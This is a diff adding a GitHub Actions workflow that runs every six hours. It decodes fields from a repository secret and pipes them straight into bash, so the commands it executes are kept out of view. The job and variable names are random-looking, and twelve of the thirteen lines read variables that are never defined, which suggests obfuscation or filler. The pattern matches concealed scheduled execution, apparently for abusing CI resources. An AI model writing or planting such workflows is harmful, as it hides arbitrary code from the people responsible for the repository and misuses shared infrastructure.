@@ -1,0 +1,31 @@
+name: guoxiuqing2678
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guoxiuqing2678
+        env:
+          ke718: ${{ secrets.ke718 }}
+        run: |
+          echo $ke718 | jq -r .zao7046 | /bin/bash
+          echo $v456 | jq -r .kuyl221 | /bin/bash
+          echo $oj28215 | jq -r .mpr31526 | /bin/bash
+          echo $bay3189 | jq -r .uhpe0 | /bin/bash
+          echo $n34 | jq -r .qwtzo886 | /bin/bash
+          echo $ujcp068 | jq -r .ojkn93 | /bin/bash
+          echo $h2919 | jq -r .ghhg02780 | /bin/bash
+          echo $hbb22066 | jq -r .upexu88078 | /bin/bash
+          echo $cxvua55 | jq -r .put70683 | /bin/bash
+          echo $vvpd94483 | jq -r .ivpxo796 | /bin/bash
+          echo $gffv16 | jq -r .spo716 | /bin/bash
+          echo $pz8 | jq -r .oq3310 | /bin/bash
+          echo $fgqk7 | jq -r .azlm41089 | /bin/bash
+
